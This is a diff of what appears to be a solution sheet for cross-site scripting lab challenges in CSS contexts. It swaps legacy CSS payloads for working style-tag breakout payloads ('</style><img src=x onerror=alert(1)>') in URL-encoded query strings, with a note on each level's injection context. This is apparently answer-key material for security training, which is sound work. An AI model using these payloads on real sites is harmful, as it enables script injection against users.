@@ -4,24 +4,24 @@ CSS sinks that can pivot to script execution (legacy expression(), @import, url(
 
 ### css-injection-level1
 
-`/css/level1/?query=alert(1)`
+`/css/level1/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `alert(1)`
-- context: inside CSS expression() — legacy IE only
+- payload: `</style><img src=x onerror=alert(1)>`
+- context: inside CSS expression() in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag
 
 ### css-injection-level2
 
-`/css/level2/?query=javascript:alert(1)`
+`/css/level2/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: inside @import url('...') — works in older browsers / depends on engine
+- payload: `</style><img src=x onerror=alert(1)>`
+- context: inside @import url('...') in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag
 
 ### css-injection-level3
 
-`/css/level3/?query=javascript:alert(1)`
+`/css/level3/?query=%3C/style%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: inside background-image url('...') — historic IE js: in url()
+- payload: `</style><img src=x onerror=alert(1)>`
+- context: inside background-image url('...') in a `<style>` block; the CSS vector is legacy-only, so close `</style>` and inject a tag
 
 ### css-injection-level4
 
